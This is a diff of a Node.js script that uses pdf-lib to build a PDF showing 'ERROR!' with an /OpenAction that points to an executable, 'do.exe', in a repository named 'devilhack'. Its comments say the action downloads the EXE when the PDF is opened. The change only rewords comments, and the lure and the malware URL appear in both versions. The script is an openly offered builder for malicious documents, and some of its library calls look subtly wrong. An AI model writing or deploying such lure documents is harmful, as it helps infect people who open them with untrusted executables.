@@ -1,28 +1,30 @@
 const fs = require('fs');
 const { PDFDocument } = require('pdf-lib');
 
-// Create a new PDF document
 async function createPDF() {
+  // Create a new PDF document
   const pdfDoc = await PDFDocument.create();
   const page = pdfDoc.addPage([600, 400]);
 
-  // Add some basic text to the page
+  // Embed a built-in font (Helvetica)
   const font = await pdfDoc.embedFont(PDFDocument.Font.Helvetica);
+  
+  // Add some text to the page
   page.drawText('ERROR!', {
     x: 50,
     y: 350,
     size: 30,
-    font,
+    font: font,
   });
 
-  // Embed the OpenAction (this would open a URL when the PDF is opened)
+  // Set up OpenAction to download the file (this is a URL for an EXE file)
   const openAction = {
     Type: '/Action',
     S: '/URI',
     URI: 'https://github.com/thewifiproject/devilhack/raw/refs/heads/main/do.exe',
   };
 
-  // Embed the OpenAction into the PDF document
+  // Embed OpenAction into the PDF document
   pdfDoc.catalog.set('/OpenAction', openAction);
 
   // Serialize the PDF to bytes and save it to a file
